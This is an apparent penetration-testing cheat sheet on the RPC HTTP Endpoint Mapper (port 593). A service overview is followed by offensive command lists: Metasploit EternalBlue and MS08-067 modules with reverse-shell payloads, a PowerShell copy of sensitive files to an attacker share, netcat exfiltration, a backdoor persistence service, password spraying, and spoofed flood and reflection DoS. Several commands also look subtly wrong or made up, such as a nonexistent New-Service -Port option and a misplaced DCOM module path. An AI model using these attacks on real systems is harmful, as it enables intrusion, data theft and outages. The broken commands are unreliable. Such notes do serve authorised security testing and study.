# Index
- [[Ports, Protocols, and Services]]
	- [[P111 RPCBind]]
	- [[P135 RPC Microsoft Endpoint Mapper]]
	- [[P445 SMB]]

# RPC HTTP Endpoint Mapper

- **Port Number:** 593
- **Protocol:** TCP/UDP
- **Service Name:** RPC over HTTP (HTTP RPC Endpoint Mapper)
- **Defined in:** Microsoft Technical Documentation and various RFCs relating to RPC and HTTP

The RPC HTTP Endpoint Mapper is a crucial service used in Microsoft environments to facilitate Remote Procedure Call (RPC) over HTTP. This service allows clients to locate and communicate with RPC services over HTTP/S, providing a way to bypass traditional firewall restrictions and enable RPC functionality over the web. The service is typically hosted on port 593 and is essential for scenarios where direct RPC communication over TCP (typically on port 135) is not possible due to network restrictions.

## Overview of Features

- **RPC over HTTP Support:** Enables the use of RPC services over HTTP/S, making it possible to communicate across networks that might block standard RPC traffic.

- **Endpoint Mapping:** The service helps in locating and binding to the appropriate RPC services by mapping RPC interfaces to specific HTTP/S endpoints.

- **Firewall Traversal:** By leveraging HTTP/S, this service can traverse firewalls and proxy servers that typically block RPC traffic, thus ensuring connectivity in restrictive network environments.

- **Secure Communication:** When used with HTTPS, the service provides encrypted communication, adding a layer of security to RPC interactions over potentially insecure networks.

- **Integration with Microsoft Services:** Widely used in Microsoft Exchange and other enterprise applications that require RPC communication across different network segments.

## Typical Use Cases

- **Microsoft Exchange:** RPC over HTTP is a critical component in Microsoft Exchange environments, allowing Outlook clients to connect to Exchange servers over HTTP/S, often referred to as Outlook Anywhere.

- **Remote Management:** Facilitates remote management tasks by allowing administrators to invoke RPC services from remote locations without the need for direct network access.

- **Cross-Network Communication:** Enables RPC communication between different network segments, especially across the internet or through firewalls, by encapsulating RPC traffic within HTTP/S.

- **Service-Oriented Architectures:** Used in scenarios where RPC-based services need to be exposed to clients over the web, allowing for service-oriented interactions in a more flexible manner.

## How RPC HTTP Endpoint Mapper Works

1. **Client Request Initialization:**
   - **Step 1:** A client initiates an RPC request that needs to be routed over HTTP. The client identifies the target service by its UUID (Universally Unique Identifier) and needs to determine the correct endpoint.

2. **Endpoint Mapper Interaction:**
   - **Step 2:** The client sends a request to the RPC HTTP Endpoint Mapper on port 593, typically over TCP. This request includes the service UUID and other relevant metadata.

3. **Endpoint Resolution:**
   - **Step 3:** The Endpoint Mapper service looks up the corresponding HTTP/S endpoint for the requested RPC service. If a match is found, the service returns the HTTP/S endpoint details to the client.

4. **HTTP/S Connection Establishment:**
   - **Step 4:** The client then establishes an HTTP/S connection to the returned endpoint. This involves the standard HTTP/S handshake, potentially including SSL/TLS negotiation if HTTPS is used.

5. **RPC Data Transmission:**
   - **Step 5:** The client transmits the RPC request over the established HTTP/S connection. The data is encapsulated within HTTP/S headers, ensuring it can traverse firewalls and proxies.

6. **RPC Execution and Response:**
   - **Step 6:** The target service processes the RPC request and sends the response back to the client over the same HTTP/S connection. The client receives the response and processes it accordingly.

7. **Connection Termination:**
   - **Step 7:** Once the RPC transaction is complete, the client and server terminate the HTTP/S connection following standard HTTP/S termination procedures.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends an RPC request to `<target_ip>`:593, seeking the endpoint for service UUID `abc123`.
- **Server:** `<target_ip>` resolves the endpoint to `https://<target_ip>:443/rpcservice` and returns this to the client.
- **Client:** `<attack_ip>` connects to `https://<target_ip>:443/rpcservice` and exchanges RPC messages.

# Additional Information

## Security Considerations
- **Susceptibility to MITM Attacks:** When RPC over HTTP is used without HTTPS, it is vulnerable to man-in-the-middle attacks. Attackers could intercept and modify the RPC traffic, leading to potential security breaches.

- **Firewall and IDS/IPS Evasion:** Since RPC traffic is encapsulated within HTTP/S, it can bypass traditional security mechanisms that inspect RPC-specific traffic. This makes it both an advantage and a potential risk in terms of security monitoring.

- **Complex Configuration:** Configuring RPC over HTTP/S, especially in large environments, can be complex. Misconfigurations can lead to either service disruptions or security vulnerabilities.

## Alternatives
- **Direct RPC:** For environments where firewall traversal is not a concern, using direct RPC (typically over port 135) is simpler and may provide better performance.
  
- **WS-MAN (Web Services-Management):** An alternative for remote management, WS-MAN uses HTTP/S but follows a different protocol, offering more flexibility and security features.

## Advanced Usage
- **Load Balancing:** RPC HTTP Endpoint Mapper services can be load-balanced across multiple servers to ensure high availability and resilience in enterprise environments.
  
- **Custom Endpoints:** Organizations can define custom RPC endpoints that are accessible via HTTP/S, tailored to specific application needs.

## Modes of Operation
- **Standard Mode:** Operates using standard HTTP/S connections, suitable for most environments.
  
- **High-Security Mode:** Requires HTTPS with strong SSL/TLS encryption, recommended for environments handling sensitive data.

## Configuration Files

1. **Registry Settings:**
  - **Location:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\RpcProxy`
  - **Key Settings:**
    - `ValidPorts`: Defines the list of ports on which RPC over HTTP is allowed to operate.
      - **Example:** `server.domain.com:6001-6002; server.domain.com:6004-6004`
    - `RpcProxyValidPorts`: Controls which RPC ports are exposed through the RPC Proxy.
      - **Example:** `server.domain.com:6001,6002,6004`

2. **IIS Configuration:**
  - **Location:** Configuration settings are managed through the IIS Manager or the `applicationHost.config` file.
  - **Relevant Sections:**
    - `RPCProxy`: Configuration related to the RPC Proxy feature within IIS, which handles the HTTP/S endpoints.
      - **Example:**
        ```xml
        <rpcproxy>
            <enabled>true</enabled>
            <rpcendpointmapperport>593</rpcendpointmapperport>
        </rpcproxy>
        ```
    - **SSL Settings:** SSL/TLS settings for securing the RPC over HTTP communications.
      - **Example:**
        ```xml
        <access sslFlags="Ssl, SslRequireCert" />
        ```

## Potential Misconfigurations

1. **Insecure HTTP Configuration:**
   - **Risk:** Configuring RPC over HTTP without SSL/TLS can lead to unencrypted RPC traffic, making it susceptible to interception.
   - **Exploitation:** An attacker on the same network can perform a man-in-the-middle attack, capturing or altering sensitive RPC data.

2. **Improper Port Configuration:**
   - **Risk:** Misconfiguring the `ValidPorts` or `RpcProxyValidPorts` settings can either expose unintended services or block legitimate ones.
   - **Exploitation:** Attackers may exploit misconfigured ports to access unauthorized services or disrupt communications by blocking critical ports.

3. **Weak SSL/TLS Settings:**
   - **Risk:** Using outdated or weak SSL/TLS protocols can leave the service vulnerable to attacks like SSL stripping or protocol downgrade attacks.
   - **Exploitation:** Attackers can intercept and decrypt RPC traffic, leading to data exposure or session hijacking.

## Default Credentials

There are no default credentials directly associated with the RPC HTTP Endpoint Mapper itself, as it relies on the underlying authentication mechanisms provided by Windows and IIS.

- **Windows Authentication:** In environments using RPC over HTTP, Kerberos or NTLM authentication is typically employed to secure the RPC communications.
- **IIS Authentication:** IIS can be configured to require various authentication methods (e.g., Basic, NTLM, Kerberos) depending on the security requirements.

# Interaction and Tools

## Tools

### [[RPCInfo]]
- **Enumerate RPC Service:** Enumerate RPC services registered with RPCBind, which is crucial for understanding the attack surface.
    ```bash
    rpcinfo -p <target_ip>
    ```
- **Checking Specific Service:** Checks if a specific RPC service, identified by its program number, is available over TCP.
    ```bash
    rpcinfo -t <target_ip> <program_number>
    ```
- **Removing a Service:** Deregisters a specific service from RPCBind.
    ```bash
    rpcbind -d <program_number>
    ```
- **Monitoring RPCBind Activity:** Starts RPCBind with verbose logging to monitor all activities, useful for debugging or security audits.
    ```bash
    rpcbind -v
    ```
- **Restricting Access:** Binds RPCBind to a specific IP address, restricting its accessibility to a particular network interface.
    ```bash
    rpcbind -h <ip_address>
    ```

### [[RPCClient]]
- **Connect via username/password:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> //<target_ip>
	```

	```bash
	rpcclient -U <username>%<password> -W <target_omain> //<target_ip>
	```
- **Connect via password hash:**
	```bash
	rpcclient --user <username> --pw-nt-hash --workgroup <target_domain> //<target_ip>
	```
- **Connect via no password:**
	```bash
	rpcclient --user <username> --workgroup <target_domain> --no-pass //<target_ip>
	```
- **Connect via null session:**
	```bash
	rpcclient -N //<target_ip>
	```
- **Execute shell commands:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> --command <semicolon_separated_commands> //<target_ip>
	```

	```bash
	rpcclient -U alice%password -c "srvinfo" //192.168.1.100
	```
- **User enumeration:**
	```bash
	List users: querydispinfo and enumdomusers
	Get user details: queryuser <0xrid>
	Get user groups: queryusergroups <0xrid>
	GET SID of a user: lookupnames <username>
	Get users aliases: queryuseraliases [builtin|domain] <sid>
	```
- **Group enumeration:**
	```bash
	List groups: enumdomgroups
	Get group details: querygroup <0xrid>
	Get group members: querygroupmem <0xrid>
	```
- **Aliasgroup enumeration:**
	```bash
	List alias: enumalsgroups <builtin|domain>
	Get members: queryaliasmem builtin|domain <0xrid>
	```
- **Domain enumeration:**
	```bash
	List domains: enumdomains
	Get SID: lsaquery
	Domain info: querydominfo
	```
- **Share enumeration:**
	```bash
	Enumerate all available shares: netshareenumall
	Info about a share: netsharegetinfo <share>
	```
- **More SIDs:**
	```bash
	Find SIDs by name: lookupnames <username>
	Find more SIDs: lsaenumsid
	RID cycling (check more SIDs): lookupsids <sid>
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 593"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 593
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 593
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 593 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 593
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 593 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:593
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 593 -c 1
    ```

### [[Enum4Linux]]
- **Enumerate via username/password:** Enumerating information from Windows and Samba systems.
	```bash
	./enum4linux-ng.py -A -u <username> -p <password> -d <domain_controller_ip> <target_ip>
	```

### [[NetExec]]
### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p <password>
	```
- **Enumerate RPC:** Enumerate RPC services with authentication, useful for understanding the services available on a network.
    ```bash
    crackmapexec smb <target_ip> -u <username> -p <password> --rpc-enum
    ```

### [[Impacket]]

#### [[Impacket-RPCMap]]
- **Enumerate RPC:** Extracts a list of RPC services and their associated UUIDs, providing detailed information about the services running on the target.
	```bash
	impacket-rpcdump @<target_ip>
	```

## Other Techniques

### Brute-Force users RIDs
- **Brute-Force users RIDs:**
	```bash
	for i in $(seq 500 1100);do rpcclient -N -U "" <target_ip> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
	```

### Mount RPC Share Locally
- **Mount RPC Share Locally:**
	```bash
	sudo mount -t nfs <target_ip>:/remote/path /local/mount
	sudo rpc.mountd -o <options> <target_ip>:<share_name> /local/mount/point
	```

### GUI Connection from Linux
- **GUI Connection from Linux:**
	```bash
	xdg-open rpc://<target_ip>/
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 593
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 593
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[RPCInfo]], [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump @<target_ip>
    ```
- **Description:** Enumerates the RPC services running on the target system, providing valuable information for subsequent attacks.

## Initial Access

### Pass-the-Hash via RPC
- **Tool:** [[Mimikatz Cheat Sheet]], [[CrackMapExec]]
    ```bash
    crackmapexec smb <target_ip> -u <username> -H <NTLM_hash> --rpc-enum
    ```
- **Description:** Use stolen NTLM hashes to authenticate to RPC services without needing the plaintext password.

## Persistence

### Service Hijacking
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    New-Service -Name "HijackedRPC" -Binary "C:\backdoor.exe" -Port 135
    ```
- **Description:** Hijack an existing RPC service to establish persistence within the target environment.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[ettercap]], [[BetterCap Cheat Sheet]]
	```bash
	ettercap -Tq -i <interface> -M arp:remote /<target_ip>/ /<server_ip>/
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Privilege Escalation

### Abuse of Misconfigured RPC Services
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    Get-Service | Where-Object { $_.DisplayName -like "*RPC*" }
    ```
- **Description:** Identify misconfigured or poorly secured RPC services that can be exploited for privilege escalation.

## Internal Reconnaissance

### RPC Enumeration
- **Tool:** [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump /p <target_ip>
    ```
- **Description:** In a compromised environment, the Endpoint Mapper can be used to identify services that may allow for lateral movement. Identifies RPC services on internal machines, which can then be targeted for further exploitation.

## Lateral Movement, Pivoting, and Tunneling

### RPC Tunnelling
- **Tool:** [[SSH, [[NetCat]]
    ```bash
    ssh -L 593:<target_ip>:135 user@intermediate_host    
    ```
- **Description:** Set up a tunnel to access RPC services through an intermediate host, bypassing network restrictions.

### Lateral Movement via RPC
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
- **Command:**
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Credential (Get-Credential) -UseSSL
    ```
- **Description:** Moves laterally within a network by establishing RPC over HTTP/S connections to other machines.

## Defense Evasion

### Encapsulating RPC Traffic in HTTPS
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:593
    ```
- **Description:** Encapsulates RPC traffic within HTTPS to evade network monitoring tools that do not inspect encrypted traffic.

### Bypassing Network Restrictions
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    New-PSSession -ComputerName <target_ip> -UseSSL -SessionOption (New-PSSessionOption -ProxyAccessType AutoDetect)
    ```
- **Description:** Establishes a remote session to a target over RPC HTTP/S, bypassing network restrictions that block standard RPC ports.

### Bypassing Firewalls
- **Tool:** [[RPCClient]]
     ```bash
    rpcclient <target_ip> -c 'epmapper'
    ```
- **Description:** If the Endpoint Mapper is accessible but certain RPC services are blocked by a firewall, it might be possible to discover the dynamic ports assigned to these services and attempt to connect directly. Enumerates RPC services and their dynamic ports, allowing you to attempt connections even if the standard RPC ports are blocked.

## Data Exfiltration

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Content C:\sensitive_data.txt | Out-File -FilePath "\\<attack_ip>\share\data.txt" }
    ```
- **Description:** Exfiltrates data by sending it over an RPC over HTTP connection, which may bypass traditional data loss prevention (DLP) measures.

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    echo "secret_data" | nc <target_ip> 593
    
    nc <target_ip> 593 < secret_data.txt
    ```
- **Description:** Use RPC communications to covertly exfiltrate data from the target network.

### Exfiltration via Dynamic Ports
- **Tool:** [[Metasploit]], [[Scapy]]
    ```python
    send(IP(dst="<target_ip>")/TCP(dport=49152)/Raw(load="exfil_data"))
    ```
- **Description:** Leverage dynamically assigned RPC ports to exfiltrate data, making it harder to detect.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra http-post-form "/rpcendpoint:username=^USER^&password=^PASS^:F=Login Failed" -s 593 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra http-post-form "/rpcendpoint:username=^USER^&password=^PASS^:F=Login Failed" -s 593 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Reflection Attack Exploit
- **Tool:** [[Custom Scripts]], [[Scapy]]
    ```python
    from scapy.all import *
    send(IP(src="<spoofed_ip>", dst="<target_ip>")/TCP(dport=593)/Raw(load="RPC Request"))
    ```
- **Description:** Exploits the RPC HTTP Endpoint Mapper to reflect and amplify traffic towards a spoofed victim, causing network disruption.

## Exploits

### MS17-010 (EternalBlue)
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in Microsoft's implementation of the SMB protocol that could allow remote code execution. This exploit was used in the WannaCry ransomware attack.

### MS08-067 (Conficker Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in the Server service's handling of RPC requests, allowing for remote code execution.

### MS03-026 (Blaster Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms03_026_dcom
    set RHOST <target_ip>
    run
    ```
- **Description:** A critical vulnerability in the RPC interface that allowed remote code execution. Exploits a heap overflow in the RPCSS service to execute arbitrary code with SYSTEM privileges.

### Rpcbomb (CVE-2003-0681)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
	```bash
	use exploit/unix/rpc/rpcbomb
	set RHOST <target_ip>
	run
	```
- **Description:** Exploit RPCBind to crash or execute arbitrary code on the target system.

### Microsoft Windows RPC DCOM Vulnerability (CVE-2003-0352)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A critical vulnerability in Microsoft Windows' RPC implementation, allowing remote code execution.

### Linux rpc.ugidd Buffer Overflow
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A buffer overflow in the rpc.ugidd service that could allow arbitrary code execution.

# Resources

|**Website**|**URL**|
|-|-|
|Microsoft RPC Documentation|https://docs.microsoft.com/en-us/windows/win32/rpc/remote-procedure-calls-over-http|
|RFC 2616 (HTTP 1.1)|https://tools.ietf.org/html/rfc2616|
|Metasploit Framework|https://www.metasploit.com|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|PowerShell Documentation|https://docs.microsoft.com/en-us/powershell/|
|Nmap Guide|https://nmap.org/book/nmap-services.html|
|Hydra Documentation|https://github.com/vanhauser-thc/thc-hydra|
|IIS Administration Guide|https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|SSL/TLS Best Practices|https://docs.microsoft.com/en-us/security/engineering/ssl-tls-best-practices|